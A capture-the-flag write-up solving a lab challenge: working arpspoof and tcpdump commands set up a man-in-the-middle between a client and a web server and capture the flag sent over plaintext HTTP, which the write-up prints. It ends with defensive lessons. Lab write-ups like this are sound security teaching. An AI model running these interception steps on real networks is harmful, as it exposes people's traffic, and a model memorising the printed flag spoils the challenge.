# Hiding in Your WiFi - CTF Solution

## Challenge Overview

**Challenge Name:** hiding-in-your-wifi  
**Category:** Network Security / Man-in-the-Middle (MITM)  
**Points:** Unknown  

### Challenge Description
The challenge presents a network scenario where:
- A client at `10.10.10.20` keeps fetching something from a web server at `10.10.10.10`
- The server only talks to the client
- You are at `10.10.10.66` (the attacker position)
- Tools available: `arpspoof` and `tcpdump`
- Remote instance: `ncat --ssl hiding-in-your-wifi-f3bbaf9e8fe8.chall.nnsc.tf 1337`

## Solution Approach

### Initial Reconnaissance

1. **Connect to the challenge instance:**
   ```bash
   ncat --ssl hiding-in-your-wifi-f3bbaf9e8fe8.chall.nnsc.tf 1337
   ```

2. **Discover environment:**
   - You're dropped into a Linux container as `player` user
   - IP address: `10.10.10.66` (attacker)
   - Hostname: `attacker-598c9464c4-ls9f7`
   - Key tools available: `arpspoof`, `tcpdump`, `socat`

3. **Network topology:**
   - Attacker (you): `10.10.10.66`
   - Victim: `10.10.10.20`
   - Server: `10.10.10.10`

### MITM Attack Setup

1. **Start ARP spoofing on both targets:**
   ```bash
   arpspoof -i eth0 -t 10.10.10.20 10.10.10.10 &
   arpspoof -i eth0 -t 10.10.10.10 10.10.10.20 &
   ```
   - This poisons the ARP cache of both the victim and server
   - Both devices now think your MAC address (`02:00:00:00:00:66`) belongs to the other device
   - All traffic between them flows through your machine

2. **Start packet capture:**
   ```bash
   tcpdump -i eth0 -n -s 0 -w /tmp/cap.pcap port 80 &
   ```
   - Captures all HTTP traffic (port 80) to a file
   - `-s 0` captures full packets (no truncation)
   - `-n` disables reverse DNS lookups (faster)

### Traffic Analysis

After waiting ~10 seconds for the victim to make HTTP requests:

```bash
tcpdump -r /tmp/cap.pcap -A -s 0 2>/dev/null
```

The output shows multiple HTTP requests to `GET /flag.txt` from the victim, each returning a 200 OK response with the flag embedded in the HTTP body.

### Flag Discovery

The flag is visible in the HTTP response payload:

```
NNS{sW17CHeD_N37Work5_57il1_7RUs7_aRP_50_K33p_YoUR_d3V1Ces_5ep4R47e}
```

This is revealed in the tcpdump `-A` output in the HTTP response section:
- Server: nginx
- Content-Type: text/plain
- Content-Length: 68
- **Flag embedded directly in the response body**

## Technical Details

### ARP Spoofing Mechanism

The attack exploits ARP (Address Resolution Protocol) which has no built-in authentication:

1. **Normal ARP behavior:**
   - Device learns MAC addresses by broadcasting ARP requests
   - Other devices respond with their IP-MAC mapping
   - Mapping stored in ARP cache for efficiency

2. **ARP spoofing attack:**
   - Attacker sends unsolicited ARP replies
   - Claims to be the target device (server or victim)
   - Overwrites legitimate MAC addresses in cache
   - Creates a MITM position

### TCP Traffic Flow

```
Victim (10.10.10.20)          Attacker (10.10.10.66)          Server (10.10.10.10)
     |                               |                               |
     |-------GET /flag.txt--------->|                               |
     |                               |-------GET /flag.txt--------->|
     |                               |<-------HTTP 200 OK-----------|
     |<-------HTTP 200 OK-----------|                               |
```

The attacker simply forwards the traffic but can intercept and read it.

## Conclusion

This challenge demonstrates the dangers of ARP spoofing in unswitched/LAN environments. The flag was hidden in the HTTP traffic between the victim and server, which the attacker intercepted using ARP poisoning.

### Key Takeaways
- ARP has no authentication - it trusts all replies
- In switched networks, ARP spoofing still works for MITM attacks
- HTTP traffic is plaintext and easily readable
- Tools like `arpspoof` and `tcpdump` are powerful for network analysis (and attacks)
- Always use HTTPS to protect against MITM attacks

### Flag
```
NNS{sW17CHeD_N37Work5_57il1_7RUs7_aRP_50_K33p_YoUR_d3V1Ces_5ep4R47e}
```